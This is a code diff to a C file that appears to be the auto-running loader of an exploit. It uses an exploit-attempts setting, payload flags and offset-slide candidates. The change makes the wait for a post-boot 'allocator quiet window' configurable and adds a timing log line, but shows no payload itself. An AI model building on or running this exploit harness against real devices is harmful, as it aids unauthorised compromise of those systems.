@@ -1,4 +1,5 @@
 #include "common.h"
+#include "boot_control.h"
 
 #ifndef DEFAULT_EXPLOIT_ATTEMPTS
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
@@ -14,7 +15,6 @@
 #ifndef DEFAULT_P0_ATTEMPT_TIMEOUT_SEC
 #define DEFAULT_P0_ATTEMPT_TIMEOUT_SEC 180
 #endif
-#define APP_MIN_BOOT_UPTIME_SEC 120
 
 #if defined(APP_PAYLOAD) && defined(SLIDE_P0_OFFSET_CANDIDATES)
 struct app_p0_shared_state {
@@ -144,29 +144,66 @@ static int attempt_delay_usec(int base_delay, int attempt) {
   return delay < 0 ? 0 : delay;
 }
 
-static void wait_for_boot_quiet_window(void) {
-#if defined(APP_PAYLOAD) && APP_PAYLOAD
-  struct timespec uptime;
+static uint64_t boottime_ms(void) {
+  struct timespec uptime = {0};
   SYSCHK(clock_gettime(CLOCK_BOOTTIME, &uptime));
-  if (uptime.tv_sec < APP_MIN_BOOT_UPTIME_SEC) {
-    time_t wait_sec = APP_MIN_BOOT_UPTIME_SEC - uptime.tv_sec;
-    pr_info("waiting for boot allocator quiet window seconds=%lld uptime=%lld\n",
-            (long long)wait_sec, (long long)uptime.tv_sec);
-    while (wait_sec > 0) {
-      wait_sec = sleep((unsigned int)wait_sec);
+  return (uint64_t)uptime.tv_sec * 1000ULL + (uint64_t)uptime.tv_nsec / 1000000ULL;
+}
+
+static long long env_long_long(const char *name, long long fallback) {
+  const char *value = getenv(name);
+  if (!value || !*value) return fallback;
+  char *end = NULL;
+  errno = 0;
+  long long parsed = strtoll(value, &end, 10);
+  return errno || end == value || *end ? fallback : parsed;
+}
+
+static void wait_for_boot_quiet_window(uint64_t constructor_uptime_ms) {
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  int configured_sec = rmg_parse_boot_min_uptime_sec(
+      getenv("RMG_BOOT_MIN_UPTIME_SEC"));
+  uint64_t wait_started_ms = boottime_ms();
+  uint64_t target_ms = (uint64_t)configured_sec * 1000ULL;
+  if (constructor_uptime_ms < target_ms) {
+    uint64_t remaining_ms = target_ms - constructor_uptime_ms;
+    pr_info("waiting for boot allocator quiet window milliseconds=%llu uptime_ms=%llu\n",
+            (unsigned long long)remaining_ms,
+            (unsigned long long)constructor_uptime_ms);
+    while (remaining_ms > 0) {
+      struct timespec delay = {
+          .tv_sec = (time_t)(remaining_ms / 1000ULL),
+          .tv_nsec = (long)((remaining_ms % 1000ULL) * 1000000ULL),
+      };
+      while (nanosleep(&delay, &delay) < 0 && errno == EINTR) {
+      }
+      uint64_t now_ms = boottime_ms();
+      remaining_ms = now_ms < target_ms ? target_ms - now_ms : 0;
     }
   }
+  uint64_t preparation_uptime_ms = boottime_ms();
+  fprintf(stdout,
+          "RMG_BOOT_V1|configured_min_uptime_sec=%d|app_request_uptime_ms=%lld|app_release_uptime_ms=%lld|process_spawn_uptime_ms=%lld|constructor_uptime_ms=%llu|payload_wait_ms=%llu|payload_release_uptime_ms=%llu|invocation_mode=%s\n",
+          configured_sec,
+          env_long_long("RMG_APP_REQUEST_UPTIME_MS", -1),
+          env_long_long("RMG_APP_RELEASE_UPTIME_MS", -1),
+          env_long_long("RMG_PROCESS_SPAWN_UPTIME_MS", -1),
+          (unsigned long long)constructor_uptime_ms,
+          (unsigned long long)(preparation_uptime_ms - wait_started_ms),
+          (unsigned long long)preparation_uptime_ms,
+          getenv("RMG_INVOCATION_MODE") ?: "unknown");
 #endif
 }
 
 __attribute__((constructor)) static void load(void) {
+  uint64_t constructor_uptime_ms = boottime_ms();
   static int started;
   if (started) {
     return;
   }
   started = 1;
   set_unbuffer();
-  wait_for_boot_quiet_window();
+  wait_for_boot_quiet_window(constructor_uptime_ms);
 
   int max_attempts = env_int(
       "EXPLOIT_ATTEMPTS", DEFAULT_EXPLOIT_ATTEMPTS, 1, 64);
